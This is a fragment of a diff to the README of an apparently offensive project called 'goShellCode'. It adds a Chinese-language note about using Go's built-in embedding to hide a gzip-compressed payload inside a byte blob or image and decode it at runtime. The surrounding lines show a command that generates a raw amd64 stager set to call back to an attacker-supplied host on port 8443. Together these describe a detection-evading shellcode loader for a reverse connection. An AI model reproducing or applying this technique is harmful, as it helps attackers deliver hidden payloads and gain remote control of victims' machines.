@@ -1,5 +1,7 @@
 # goShellCode
 
+golang自带的嵌入，思路打开，嵌入一个byte的压缩包，图片，然后解密，这里采用的自带的的gzip
+
 //生成shellcode
 
 generate stager --lhost HOST --lport 8443 --arch amd64 --format raw --save ./raw_shellcode
